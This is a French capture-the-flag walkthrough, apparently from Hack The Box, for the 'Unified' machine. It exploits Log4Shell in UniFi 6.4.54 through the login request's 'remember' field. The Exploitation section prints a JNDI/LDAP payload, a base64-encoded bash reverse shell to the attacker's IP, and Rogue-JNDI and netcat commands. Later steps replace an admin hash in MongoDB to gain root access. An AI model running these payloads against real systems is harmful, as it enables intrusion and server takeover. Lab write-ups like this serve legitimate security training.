# Unified Write-up

## Introduction

Ce write-up explore les effets de l'exploitation de Log4J dans un système de surveillance de réseau bien connu appelé "UniFi". Cette machine vous montrera comment configurer et installer les packages et outils nécessaires pour exploiter UniFi en abusant de la vulnérabilité Log4J et en manipulant un en-tête POST appelé remember, vous donnant un shell inverse sur la machine. Vous changerez également le mot de passe de l'administrateur en modifiant le hash sauvegardé dans l'instance MongoDB qui fonctionne sur le système, ce qui permettra l'accès au panneau d'administration et mènera à la divulgation du mot de passe SSH de l'administrateur.

## Énumération

La première étape consiste à scanner l'adresse IP cible avec Nmap pour vérifier quels ports sont ouverts. Nous utiliserons Nmap pour cela.

- **Commande** : `nmap -sC -sV -v {TARGET_IP}`

Le scan révèle que le port 8080 est ouvert et qu'un proxy HTTP y est en cours d'exécution. Le proxy semble rediriger les requêtes vers le port 8443, qui semble faire fonctionner un serveur web SSL. Nous notons que le titre de la page HTTP sur le port 8443 est "UniFi Network".

En accédant à la page avec un navigateur, nous sommes présentés avec la page de connexion au portail web UniFi et la version est 6.4.54. Une recherche rapide sur Google avec les mots-clés "UniFi 6.4.54 exploit" révèle un article qui discute en profondeur de l'exploitation de la vulnérabilité CVE-2021-44228 au sein de cette application.

Pour en savoir plus sur la vulnérabilité Log4J, vous pouvez consulter ces liens :
- [Sprocket Security Blog](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)
- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Hack The Box Blog](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation)

## Exploitation

La vulnérabilité Log4J peut être exploitée en injectant des commandes système (OS Command Injection), une vulnérabilité de sécurité web qui permet à un attaquant d'exécuter des commandes arbitraires sur le serveur exécutant l'application. Pour vérifier cela, nous pouvons utiliser FoxyProxy après avoir effectué une requête POST au point de terminaison `/api/login` pour passer la requête à BurpSuite, qui l'interceptera en tant qu'homme du milieu. La requête peut alors être modifiée pour injecter des commandes.

Nous tentons de nous connecter à la page avec les identifiants test:test pour capturer la requête de connexion avec BurpSuite et la modifier. Nous envoyons ce paquet HTTPS au module Repeater de BurpSuite en appuyant sur CTRL+R.

L'article mentionné indique que nous devons entrer notre payload dans le paramètre remember. Le POST est envoyé en tant qu'objet JSON et parce que le payload contient des accolades `{}`, pour éviter qu'il ne soit analysé comme un autre objet JSON, nous l'encadrons avec des guillemets pour qu'il soit analysé en tant que chaîne de caractères.

Nous saisissons le payload dans le champ remember pour identifier un point d'injection, s'il en existe un. Si la requête provoque une connexion du serveur vers nous, cela signifie que l'application est vulnérable.

### Utilisation de JNDI et LDAP

JNDI (Java Naming and Directory Interface API) est utilisé pour localiser des ressources et d'autres objets de programme. LDAP (Lightweight Directory Access Protocol) est un protocole standard pour accéder et maintenir des services d'information de répertoire distribués.

Nous construisons un payload :

- **Payload** : `${jndi:ldap://{Your Tun0 IP}/whatever}`

Ensuite, nous démarrons `tcpdump` pour surveiller le trafic réseau sur le port 389 :

- **Commande** : `sudo tcpdump -i tun0 port 389`

Après avoir cliqué sur "Send" dans BurpSuite, nous observons que l'application se connecte à notre machine, prouvant sa vulnérabilité.

### Installation des outils nécessaires

Nous devons installer Open-JDK et Maven pour construire un payload et obtenir une exécution de code à distance (RCE) sur le système vulnérable.

- **Commande** : `sudo apt-get install openjdk-11-jdk maven`

Ensuite, nous clonons et construisons l'application Rogue-JNDI :

- **Commande** : `git clone https://github.com/veracode-research/rogue-jndi`
- **Commande** : `cd rogue-jndi`
- **Commande** : `mvn package`

### Construction du Payload

Nous construisons notre payload en l'encodant en Base64 :

- **Commande** : `echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64`

Nous démarrons ensuite l'application Rogue-JNDI avec notre payload :

- **Commande** : `java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP}"`

Nous démarrons un écouteur Netcat :

- **Commande** : `nc -lvp 4444`

Enfin, nous modifions la requête interceptée dans BurpSuite pour inclure notre payload JNDI et l'envoyons. Nous obtenons un shell sur notre écouteur Netcat et nous pouvons améliorer notre shell :

- **Commande** : `script /dev/null -c bash`

le flag user est dans

- **Commande** : `cd /home/michael`
- **Commande** : `cat user.txt`

## Escalade de Privilèges

Nous devons vérifier si MongoDB est en cours d'exécution sur le système cible, car cela pourrait nous permettre d'extraire les identifiants de l'administrateur pour nous connecter au panneau d'administration.

- **Commande** : `ps aux | grep mongo`

MongoDB est en cours d'exécution sur le port 27117. Nous utilisons l'utilitaire en ligne de commande mongo pour interagir avec MongoDB et extraire le mot de passe de l'administrateur :

- **Commande** : `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

La sortie révèle un utilisateur appelé Administrator avec un hash de mot de passe dans la variable x_shadow. Nous remplaçons ce hash par le nôtre en utilisant la commande mkpasswd pour créer un nouveau hash SHA-512 :

- **Commande** : `mkpasswd -m sha-512 Password1234`

Ensuite, nous mettons à jour le hash dans MongoDB :

- **Commande** : `mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'`

Nous nous connectons maintenant à l'interface web d'UniFi avec les nouvelles informations d'identification administrateur. L'accès est réussi et nous accédons aux paramètres d'authentification SSH.

Le mot de passe root SSH est affiché en clair : `NotACrackablePassword4U2022`. Nous utilisons ce mot de passe pour nous connecter en SSH :

- **Commande** : `ssh root@10.129.96.149`

Le flag root peut être trouvé dans le dossier /root :

- **Commande** : `cd /root`
- **Commande** : `ls`
- **Commande** : `cat root.txt`

Félicitations, vous avez terminé la machine Unified !
